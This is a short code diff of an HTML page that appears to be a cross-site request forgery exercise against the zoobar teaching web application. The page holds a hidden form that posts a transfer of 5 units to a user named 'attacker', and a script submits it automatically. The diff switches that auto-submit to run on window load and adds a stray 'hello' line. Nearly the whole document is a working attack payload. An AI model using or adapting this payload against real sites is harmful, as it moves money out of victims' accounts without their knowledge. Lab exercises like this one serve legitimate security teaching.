@@ -1,10 +1,11 @@
 <form action="http://zoobar.org:5000/transfer" method="post" accept-charset="utf-8" id="stealer">
   <input type="hidden" name="name" value="attacker">
   <input type="hidden" name="amount" value="5">
+	hello
 </form>
 <script type="text/javascript" charset="utf-8">
-(function() {
+window.onload = function() {
   var stealer = document.getElementById('stealer');
   stealer.submit();
-})();
+};
 </script>
